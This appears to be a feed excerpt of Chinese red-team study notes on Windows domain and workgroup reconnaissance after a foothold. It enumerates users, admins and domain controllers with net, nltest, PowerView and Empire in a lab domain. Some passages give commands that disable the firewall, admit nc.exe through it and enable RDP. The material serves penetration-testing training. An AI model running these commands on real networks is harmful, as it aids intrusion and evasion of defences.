title="2、收集域内基础信息"></a>2、收集域内基础信息</h2><h3 id="查看域"><a href="#查看域" class="headerlink" title="查看域"></a>查看域</h3><pre><code>net view /domain</code></pre><pre><code>C:\Users\daniel10&gt; net view /domainDomain-------------------------------------------------------------------------------TEAMSSIX命令成功完成。</code></pre><h3 id="查看域内计算机"><a href="#查看域内计算机" class="headerlink" title="查看域内计算机"></a>查看域内计算机</h3><pre><code>net view /domain:domain_name</code></pre><pre><code>C:\Users\daniel10&gt; net view /domain:teamssix服务器名称            注解-------------------------------------------------------------------------------\\DANIEL10\\DANIEL7\\DC命令成功完成。</code></pre><h3 id="查看域内用户组列表"><a href="#查看域内用户组列表" class="headerlink" title="查看域内用户组列表"></a>查看域内用户组列表</h3><pre><code>net group /domain</code></pre><pre><code>C:\Users\daniel10&gt; net group /domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的组帐户-------------------------------------------------------------------------------*Admins*Domain Admins*Domain Computers*Domain Users*Enterprise Admins命令成功完成。</code></pre><h3 id="查看域用户组信息"><a href="#查看域用户组信息" class="headerlink" title="查看域用户组信息"></a>查看域用户组信息</h3><pre><code>net group &quot;Enterprise Admins&quot; /domain</code></pre><pre><code>C:\Users\daniel10&gt; net group &quot;Enterprise Admins&quot; /domain这项请求将在域 teamssix.com 的域控制器处理。组名     Enterprise Admins注释     指定的公司系統管理員成员-------------------------------------------------------------------------------Administrator命令成功完成。</code></pre><h3 id="查看域密码策略信息"><a href="#查看域密码策略信息" class="headerlink" title="查看域密码策略信息"></a>查看域密码策略信息</h3><pre><code>net accounts /domain</code></pre><pre><code>C:\Users\daniel10&gt; net accounts /domain这项请求将在域 teamssix.com 的域控制器处理。强制用户在时间到期之后多久必须注销?:     从不密码最短使用期限(天):                  1密码最长使用期限(天):                  42密码长度最小值:                        7保持的密码历史记录长度:                 24锁定阈值:                            从不锁定持续时间(分):                      30锁定观测窗口(分):                      30计算机角色:                           PRIMARY命令成功完成。</code></pre><h3 id="查看域信任信息"><a href="#查看域信任信息" class="headerlink" title="查看域信任信息"></a>查看域信任信息</h3><pre><code>nltest /domain_trusts</code></pre><pre><code>C:\Users\daniel10&gt; nltest /domain_trusts域信任的列表:    0: TEAMSSIX teamssix.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)此命令成功完成</code></pre><h2 id="3、收集域用户和管理员信息"><a href="#3、收集域用户和管理员信息" class="headerlink" title="3、收集域用户和管理员信息"></a>3、收集域用户和管理员信息</h2><h3 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h3><pre><code>net user /domain</code></pre><pre><code>C:\Users\daniel10&gt; net user /domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的用户帐户-------------------------------------------------------------------------------admin                    Administrator                    daniel10</code></pre><h3 id="查询域用户详细信息"><a href="#查询域用户详细信息" class="headerlink" title="查询域用户详细信息"></a>查询域用户详细信息</h3><pre><code>wmic useraccount get /all</code></pre><pre><code>C:\Users\daniel10&gt; wmic useraccount get /allAccountType  Caption                        Description                                                     Disabled  Domain    FullName                               InstallDate  LocalAccount  Lockout  Name                  PasswordChangeable  PasswordExpires  PasswordRequired  SID                                            SIDType  Status512          DANIEL10\Administrator         管理计算机(域)的内置帐户                                        TRUE      DANIEL10                                                      TRUE          FALSE    Administrator         TRUE                FALSE            TRUE              S-1-5-21-1097120846-822447287-3576165687-500   1        Degraded512          DANIEL10\DefaultAccount        系统管理的用户帐户。                                            TRUE      DANIEL10                                                      TRUE          FALSE    DefaultAccount        TRUE                FALSE            FALSE             S-1-5-21-1097120846-822447287-3576165687-503   1        Degraded</code></pre><h3 id="查询存在的用户"><a href="#查询存在的用户" class="headerlink" title="查询存在的用户"></a>查询存在的用户</h3><pre><code>dsquery user</code></pre><pre><code>C:\Users\daniel10&gt; dsquery user&quot;CN=Administrator,CN=Users,DC=teamssix,DC=com&quot;&quot;CN=Guest,CN=Users,DC=teamssix,DC=com&quot;</code></pre><p>常用的 dsquery 命令</p><pre><code>dsquery computer - 查找目录中的计算机dsquery contact - 查找目录中的联系人dsquery subnet - 查找目录中的子网dsquery group - 查找目录中的组dsquery ou - 查找目录中的组织单位dsquery site - 查找目录中的站点dsquery server - 查找目录中的域控制器dsquery user - 查找目录中的用户dsquery quota - 查找目录中的配额dsquery partition - 查找目录中的分区dsquery * - 用通用的 LDAP 查询查找目录中的任何对象</code></pre><h2 id="4、查找域控制器"><a href="#4、查找域控制器" class="headerlink" title="4、查找域控制器"></a>4、查找域控制器</h2><h3 id="查看域控器机器名"><a href="#查看域控器机器名" class="headerlink" title="查看域控器机器名"></a>查看域控器机器名</h3><pre><code>nltest /DCLIST:teamssix</code></pre><pre><code>C:\Users\daniel10&gt; nltest /DCLIST:teamssix获得域“teamssix”中 DC 的列表(从“\\DC”中)。    dc.teamssix.com [PDC]  [DS] 站点: Default-First-Site-Name此命令成功完成</code></pre><h3 id="查看域控器主机名"><a href="#查看域控器主机名" class="headerlink" title="查看域控器主机名"></a>查看域控器主机名</h3><pre><code>nslookup -type=SRV _ldap._tcp</code></pre><pre><code>C:\Users\daniel10&gt; nslookup -type=SRV _ldap._tcp_ldap._tcp.teamssix.com SRV service location:          priority       = 0          weight         = 100          port           = 389          svr hostname   = dc.teamssix.comdc.teamssix.com internet address = 192.168.7.7</code></pre><pre><code>netdom query pdc</code></pre><pre><code>C:\Users\daniel10&gt; netdom query pdc域的主域控制器:DC命令成功完成。</code></pre><h3 id="查看域控器组"><a href="#查看域控器组" class="headerlink" title="查看域控器组"></a>查看域控器组</h3><pre><code>net group &quot;domain controllers&quot; /domain</code></pre><pre><code>C:\Users\daniel10&gt; net group &quot;domain controllers&quot; /domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Controllers注释     在網域所有的網域控制站成员-------------------------------------------------------------------------------DC$命令成功完成。</code></pre><h2 id="5、定位域管理员"><a href="#5、定位域管理员" class="headerlink" title="5、定位域管理员"></a>5、定位域管理员</h2><h3 id="psloggedon"><a href="#psloggedon" class="headerlink" title="psloggedon"></a>psloggedon</h3><p>在 Windows 上使用 <code>net session</code> 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户。</p><p>psloggedon 下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p><pre><code>psloggedon.exe [-] [-l] [-x] [\\computername|username]-                                显示支持的选项和用于输出值的单位。-l                            仅显示本地登录，不显示本地和网络资源登录。-x                            不显示登录时间。\\computername    指定要列出登录信息的计算机的名称。Username                指定用户名，在网络中搜索该用户登录的计算机。</code></pre><pre><code>C:\Users\daniel10&gt; PsLoggedon.exe -l \\192.168.7.7Users logged on locally:2021/2/13 20:53:08         TEAMSSIX\Administrator</code></pre><h3 id="PVEFindADUser"><a href="#PVEFindADUser" class="headerlink" title="PVEFindADUser"></a>PVEFindADUser</h3><p>PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限。</p><p>PVEFindADUser 下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p><pre><code>-h                                            显示帮助信息-u                                            检测程序是否有新版本-current [&quot;username&quot;]        -current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC-noping                                    阻止尝试枚举用户登录名之前对目标计算机执行ping命令-target                                    此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中</code></pre><pre><code>C:\Users\daniel10&gt; PVEFindADUser.exe -current [+] Finding currently logged on users ? true [+] Finding last logged on users ? false [+] Enumerating all computers... [+] Number of computers found : 15 [+] Launching queries     [+] Processing host : dc.teamssix.com (Windows Server 2008 R2 Datacenter;Service Pack 1)         - Logged on user : teamssix\administrator     [+] Processing host : daniel7.teamssix.com (Windows 7 专业版;Service Pack 1)     [+] Processing host : daniel10.teamssix.com (Windows 10 专业版) [+] Report written to report.csv</code></pre><h3 id="netview"><a href="#netview" class="headerlink" title="netview"></a>netview</h3><p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p><p>Netview 下载地址：<a href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p><pre><code>-h               显示帮助信息-f filename.txt  指定要提取主机列表的文件-e filename.txt  指定要排除的主机名的文件-o filename.txt  将所有输出重定向到指定的文件-d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表-g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索-c               对已找到的共享目录/文件的访问权限进行检查-i interval      枚举主机之间等待的秒数-j jitter        应用于间隔的抖动百分比（0.0-1.0）</code></pre><pre><code>C:\Users\daniel10&gt; netview.exe -d[+] Number of hosts: 3[+] Host: DANIEL10Enumerating AD Info[+] DANIEL10 - Comment -[+] D - OS Version - 10.0[+] DANIEL10 - MSSQL ServerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.110Enumerating Share InfoEnumerating Session InfoEnumerating Logged-on Users[+] DANIEL10 - Logged-on - TEAMSSIX\daniel10[+] Host: DCEnumerating AD Info[+] DC - Comment -[+] D - OS Version - 6.1[+] DC - Domain ControllerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.7……内容较多故省略……</code></pre><h3 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h3><p>常用的 NSE 脚本如下：</p><p><code>smb-enum-domains.nse</code>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p><p><code>smb-enum-users.nse</code>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p><p><code>smb-enum-shares.nse</code>:遍历远程主机的共享目录</p><p><code>smb-enum-processes.nse</code>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p><p><code>smb-enum-sessions.nse</code>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p><p><code>smb-os-discovery.nse</code>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p><p>NES 脚本下载地址：<a href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p><pre><code>C:\Users\daniel10&gt; nmap --script=smb-os-discovery.nse -p 445 192.168.7.107Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-21 09:44 CSTNmap scan report for 192.168.7.107Host is up (0.00053s latency).PORT    STATE SERVICE445/tcp open  microsoft-dsHost script results:| smb-os-discovery:|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional|   Computer name: daniel7|   NetBIOS computer name: DANIEL7\x00|   Domain name: teamssix.com|   Forest name: teamssix.com|   FQDN: daniel7.teamssix.com|_  System time: 2021-02-21T09:44:33+08:00Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds</code></pre><p> <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-23_17-38-11.png"></p><h3 id="PowerView-脚本"><a href="#PowerView-脚本" class="headerlink" title="PowerView 脚本"></a>PowerView 脚本</h3><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code> $Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。</p><p>接着在 powershell中输入<code> Import-Module PowerView</code>即可导入PowerView，使用<code> Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p><pre><code>PS C:\Users\daniel10&gt; Import-Module PowerViewPS C:\Users\daniel10&gt; Get-Command -Module PowerViewCommandType     Name                                               Version    Source-----------     ----                                               -------    ------Alias           Find-UserTrustGroup                                1.0        PowerViewAlias           Get-ComputerProperties                             1.0        PowerView……内容较多故省略……</code></pre><p>PowerView 脚本下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><blockquote><p>注：在打开上面的下载地址时会看到该项目已被转移到其他项目下，但是当我在使用新版本的 PowerView 脚本时，发现找不到<code>Invoke-StealthUserHunter</code>命令，而旧版本的 PowerView 有<code>Invoke-StealthUserHunter</code>命令</p></blockquote><p><strong>Invoke-StealthUserHunter</strong>：只需要进行一次查询，就可以获取域里面的所有用户。其原理为：从<code>user.HomeDirectories</code>中提取所有用户，并对每个服务器进行<code>Get-NetSession</code>获取。因不需要使用<code>Invoke-UserHunter</code>对每台机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView 默认使用<code>Invoke-StealthUserHunter</code>如果找不到需要的信息，就会使用<code>Invoke-UserHunter</code>.</p><p><strong>Invoke-UserHunter</strong>：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。使用<code>Get-NetSession</code>和<code>Get-NetLoggedon</code>(调用 NetSessionEnum 和 NetWkstaUserEnumAPI )扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</p><pre><code>PS C:\Users\daniel10&gt; Invoke-UserHunterUserDomain   : TEAMSSIXUserName     : AdministratorComputerName : dc.teamssix.comIP           : 192.168.7.7SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : daniel10ComputerName : daniel10.teamssix.comIP           : 192.168.7.110SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : AdministratorComputerName : daniel7.teamssix.comIP           : 192.168.7.107SessionFrom  :LocalAdmin   :</code></pre><p>PowerView 中的其他信息收集模块：</p><ul><li>Get-NetDomain:获取当前用户所在域名称</li><li>Get-NetUser：获取所有用户的详细信息</li><li>Get-NetDomainController：获取所有域控制器的信息</li><li>Get-NetComputer：获取域内所有机器的详细信息</li><li>Get-NetOU：获取域中的OU信息</li><li>Get-NetGroup：获取所有域内组和组成员信息</li><li>Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息</li><li>Get-NetShare：获取当前域内所有的网络共享信息</li><li>Get-NetSession：获取指定服务器的会话</li><li>Get-NetRDPSession：获取指定服务器的远程连接</li><li>Get-NetProcess：获取远程主机的进程</li><li>Get-UserEvent：获取指定用户的日志</li><li>Get-ADObject：获取活动目录的对象</li><li>Get-NetGPO：获取域内所有组的策略对象</li><li>Get-DomainPolicy：获取域默认策略或域控制器策略</li><li>Invoke-UserHunter：获取域用户登陆的计算机信息及该用户是否有本地管理员权限</li><li>Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户</li><li>Invoke-UserEventHunter：根据用户日志查询某域用户登陆过哪些域机器</li></ul><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>Empire中的<code>user_hunter</code>模块用于查找域管理员登陆的机器，使用 powershell/situational_awareness/network/powerview/user_hunter 模块，可查看哪个用户登陆哪台主机。</p><pre><code>(Empire: listeners) &gt; agents[*] Active agents: Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen ----     -- -----------     ------------      --------                -------            ---    -----    --------- 3XRCWAB2 ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         2256   5/0.0    2021-02-22 20:39:54(Empire: agents) &gt; usemodule powershell/powershell/situational_awareness/network/powerview/user_hunter(Empire: powershell/situational_awareness/network/powerview/user_hunter) &gt; set Agent 3XRCWAB2(Empire: powershell/situational_awareness/network/powerview/user_hunter) &gt; execute[*] Tasked 3XRCWAB2 to run TASK_CMD_JOB[*] Agent 3XRCWAB2 tasked with task ID 1[*] Tasked agent 3XRCWAB2 to run module powershell/situational_awareness/network/powerview/user_hunter[*] Valid results returned by 192.168.7.7……</code></pre><h2 id="6、查找域管理员进程"><a href="#6、查找域管理员进程" class="headerlink" title="6、查找域管理员进程"></a>6、查找域管理员进程</h2><h3 id="获取域管理员列表"><a href="#获取域管理员列表" class="headerlink" title="获取域管理员列表"></a>获取域管理员列表</h3><pre><code>net group &quot;Domain Admins&quot; /domain</code></pre><pre><code>C:\Users\daniel10&gt;net group &quot;Domain Admins&quot; /domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Admins注释     指定的域管理员成员-------------------------------------------------------------------------------Administrator命令成功完成。</code></pre><h3 id="列出本机的所有进程及进程用户"><a href="#列出本机的所有进程及进程用户" class="headerlink" title="列出本机的所有进程及进程用户"></a>列出本机的所有进程及进程用户</h3><pre><code>tasklist /v</code></pre><pre><code>C:\Users\daniel10&gt;tasklist /v映像名称                       PID 会话名              会话#       内存使用  状态            用户名                                                 CPU 时间 窗口标题========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================System Idle Process              0 Services                   0          8 K Unknown         NT AUTHORITY\SYSTEM                                    68:35:16 暂缺System                           4 Services                   0        924 K Unknown         暂缺                                                    0:24:14 暂缺svchost.exe                   9228 Console                    2      2,932 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺tasklist.exe                 10768 Console                    2      9,540 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺……内容过多省略……</code></pre><p>如果在列出的进程中看到了用户名为管理员用户名的话，便是找到了域管理员进程。</p><blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/qq_36279445/article/details/110647055">https://blog.csdn.net/qq_36279445/article/details/110647055</a></p><p><a href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、判断是否存在域&quot;&gt;&lt;a href=&quot;#1、判断是否存在域&quot; class=&quot;headerlink&quot; title=&quot;1、判断是否存在域&quot;&gt;&lt;/a&gt;1、判断是否存在域&lt;/h2&gt;&lt;h3 id=&quot;ipconfig&quot;&gt;&lt;a href=&quot;#ipconfig&quot; class=&quot;</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】3、本地工作组信息收集</title>
    <link href="https://www.teamssix.com/year/210211-160909.html"/>
    <id>https://www.teamssix.com/year/210211-160909.html</id>
    <published>2021-02-11T08:09:09.000Z</published>
    <updated>2021-02-11T08:35:00.687Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、手动收集本地工作组信息"><a href="#1、手动收集本地工作组信息" class="headerlink" title="1、手动收集本地工作组信息"></a>1、手动收集本地工作组信息</h2><ul><li>查看当前权限</li></ul><pre><code>whoami </code></pre><ul><li>本机网络配置信息</li></ul><pre><code>ipconfig /all</code></pre><ul><li>操作系统和版本信息（英文版）</li></ul><pre><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; </code></pre><ul><li>操作系统和版本信息（中文版）</li></ul><pre><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code></pre><ul><li>查看系统体系结构</li></ul><pre><code>echo %PROCESSOR_ARCHITECTURE%</code></pre><ul><li>查看系统所有环境变量</li></ul><pre><code>set</code></pre><ul><li>查看安装的软件及版本和路径等信息</li></ul><pre><code>wmic product get name,version</code></pre><ul><li>利用 PowerShell 收集软件版本信息</li></ul><pre><code>powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</code></pre><ul><li>查询本机服务信息</li></ul><pre><code>wmic service list brief</code></pre><ul><li>查询进程列表</li></ul><pre><code>tasklist /v</code></pre><ul><li>wmic 查看进程信息</li></ul><pre><code>wmic process list brief</code></pre><ul><li>查看启动程序信息</li></ul><pre><code>wmic startup get command,caption</code></pre><ul><li>查看计划任务</li></ul><pre><code>schtasks /query /fo LIST /v</code></pre><ul><li>查看主机开启时间</li></ul><pre><code>net statistics workstation</code></pre><ul><li>查询用户列表</li></ul><pre><code>net user</code></pre><ul><li> 查看指定用户的信息</li></ul><pre><code>net user teamssix</code></pre><ul><li> 查看本地管理员用户</li></ul><pre><code>net localgroup administrators</code></pre><ul><li>查看当前在线用户</li></ul><pre><code>query user || qwinsta</code></pre><ul><li>列出或断开本地计算机和连接的客户端的会话 </li></ul><pre><code>net session</code></pre><ul><li>查看端口列表</li></ul><pre><code>netstat –ano</code></pre><ul><li>查看补丁列表</li></ul><pre><code>systeminfo</code></pre><ul><li>使用 wmic 查看补丁列表</li></ul><pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><ul><li>查看本机共享</li></ul><pre><code>net share</code></pre><ul><li>使用 wmic 查看共享列表</li></ul><pre><code>wmic share get name,path,status</code></pre><ul><li>查询路由表及所有可用接口的ARP 缓存表 </li></ul><pre><code>route printarp –a</code></pre><ul><li><p>查询防火墙相关配置 </p><ul><li>关闭防火墙</li></ul><pre><code>netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)netsh advfirewall set allprofiles state off    (Windows Server 2003 系统及之后版本)</code></pre><ul><li>查看防火墙配置</li></ul><pre><code>netsh firewall show config</code></pre><ul><li>修改防火墙配置</li></ul><pre><code>(Windows Server 2003 系统及之前版本)允许指定程序全部连接netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable(Windows Server 2003 之后系统版本)允许指定程序连入netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;允许指定程序连出netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;允许 3389 端口放行netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></pre><ul><li>自定义防火墙日志储存位置</li></ul><pre><code>netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</code></pre></li><li><p>查看计算机代理配置情况 </p></li></ul><pre><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></pre><ul><li><p>查询并开启远程连接服务</p><ul><li>查看远程连接端口（0xd3d换成10进制即3389）</li></ul><pre><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></pre><ul><li>在Windows Server 2003 中开启3389 端口</li></ul><pre><code>wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</code></pre><ul><li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li></ul><pre><code>wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre></li></ul><h2 id="2、自动收集本地工作组信息"><a href="#2、自动收集本地工作组信息" class="headerlink" title="2、自动收集本地工作组信息"></a>2、自动收集本地工作组信息</h2><h3 id="wmic-脚本"><a href="#wmic-脚本" class="headerlink" title="wmic 脚本"></a>wmic 脚本</h3><p>wmic 脚本下载地址：<a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-11_12-59-56.png"></p><h3 id="PowerShsell-Empire"><a href="#PowerShsell-Empire" class="headerlink" title="PowerShsell Empire"></a>PowerShsell Empire</h3><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p><ul><li><p>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</p></li><li><p>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</p></li></ul><p>当使用 Empire 使主机上线后，可调用<code>powershell/situational_awareness/host/winenum</code>模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-11_15-27-11.png"></p><p>调用<code>powershell/situational_awareness/host/computerdetails</code>模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p><blockquote><p>参考链接：</p><p><a href="https://www.freebuf.com/sectool/158393.html">https://www.freebuf.com/sectool/158393.html</a></p><p><a href="https://www.freebuf.com/articles/system/114731.html">https://www.freebuf.com/articles/system/114731.html</a></p><p><a href="https://blog.csdn.net/bring_coco/article/details/113550173">https://blog.csdn.net/bring_coco/article/details/113550173</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、手动收集本地工作组信息&quot;&gt;&lt;a href=&quot;#1、手动收集本地工作组信息&quot; class=&quot;headerlink&quot; title=&quot;1、手动收集本地工作组信息&quot;&gt;&lt;/a&gt;1、手动收集本地工作组信息&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;查看当前权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】2、PowerShell</title>
    <link href="https://www.teamssix.com/year/210206-191859.html"/>
    <id>https://www.teamssix.com/year/210206-191859.html</id>
    <published>2021-02-06T11:18:59.000Z</published>
    <updated>2021-02-06T11:21:28.196Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。</p><p>PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。</p><p>PowerShell 有如下特点：</p><ul><li>Windows 7 以上的操作系统默认安装</li><li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载 PowerShell 脚本并执行</li><li>目前很多工具都是基于 PowerShell 开发的</li><li>很多安全软件检测不到 PowerShell 的活动</li><li>cmd 通常会被阻止运行，但是 PowerShell 不会</li><li>可以用来管理活动目录</li></ul><p>可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：</p><pre><code>PS C:\Users\teamssix&gt; Get-HostName             : ConsoleHostVersion          : 5.1.18362.1171InstanceId       : a0a6f8f2-f86a-477f-bf4b-b94b452bee3cUI               : System.Management.Automation.Internal.Host.InternalHostUserInterfaceCurrentCulture   : zh-CNCurrentUICulture : zh-CNPrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxyDebuggerEnabled  : TrueIsRunspacePushed : FalseRunspace         : System.Management.Automation.Runspaces.LocalRunspace</code></pre><pre><code>PS C:\Users\teamssix&gt; $PSVersionTableName                           Value----                           -----PSVersion                      5.1.18362.1171PSEdition                      DesktopPSCompatibleVersions           &#123;1.0, 2.0, 3.0, 4.0...&#125;BuildVersion                   10.0.18362.1171CLRVersion                     4.0.30319.42000WSManStackVersion              3.0PSRemotingProtocolVersion      2.3SerializationVersion           1.1.0.1</code></pre><p>Windows 操作系统对应的 PowerShell 版本信息：</p><p>1.0        windows server 2008</p><p>2.0        windows server 2008 r2、windows 7</p><p>3.0        windows server 2012、windows 8</p><p>4.0        windows server 2012 r2、windows 8.1</p><p>5.0        